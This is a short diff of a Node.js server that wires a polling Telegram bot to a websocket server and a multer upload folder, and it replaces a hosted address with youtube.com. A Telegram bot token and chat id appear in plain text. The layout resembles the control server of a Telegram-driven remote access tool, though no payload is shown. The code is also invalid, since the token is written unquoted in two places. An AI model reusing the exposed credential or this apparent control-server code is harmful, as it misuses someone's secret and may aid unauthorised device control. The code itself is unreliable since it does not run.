@@ -9,12 +9,12 @@ const axios = require("axios");
 
 const token = 8437062091:AAE2_0C9hJy7iDq6lBo16xHarTZvwk0nTzM
 const id = 7019231224
-const address = 'https://pagal-zqdr.onrender.com'
+const address = 'https://www.youtube.com'
 
 const app = express();
 const appServer = http.createServer(app);
 const appSocket = new webSocket.Server({server: appServer});
-const appBot = new telegramBot(8437062091:AAE2_0C9hJy7iDq6lBo16xHarTZvwk0nTzM, {polling: true});
+const appBot = new telegramBot(token, {polling: true});
 const appClients = new Map()
 
 const upload = multer({ dest: 'uploadedFile/' });
